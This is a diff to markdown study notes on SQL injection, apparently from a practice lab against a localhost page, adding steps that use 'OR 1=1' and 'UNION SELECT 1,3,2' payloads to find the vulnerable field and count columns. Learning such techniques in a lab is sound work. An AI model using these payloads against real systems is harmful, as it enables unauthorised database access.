@@ -126,9 +126,10 @@ ________________________________________________________________________________
 ### Only need to select one and then change the number to see which field is vulnerable
     http://127.0.0.1:20002/pick.php?product=7 OR 1=1        #the vuln field because displays everything
 ______________________________________________________________________________________________________________
-## 
-### 
-
+## After finding the vuln field we can check how many fields there are
+### Simply by dropping the OR statement and swapping with UNION SELECT 1,2,3 (increment until errors)
+#### also notice for this there are only 3 fields, but they are out of order so adjust to match below
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT 1,3,2
 ______________________________________________________________________________________________________________
 ## 
 ### 
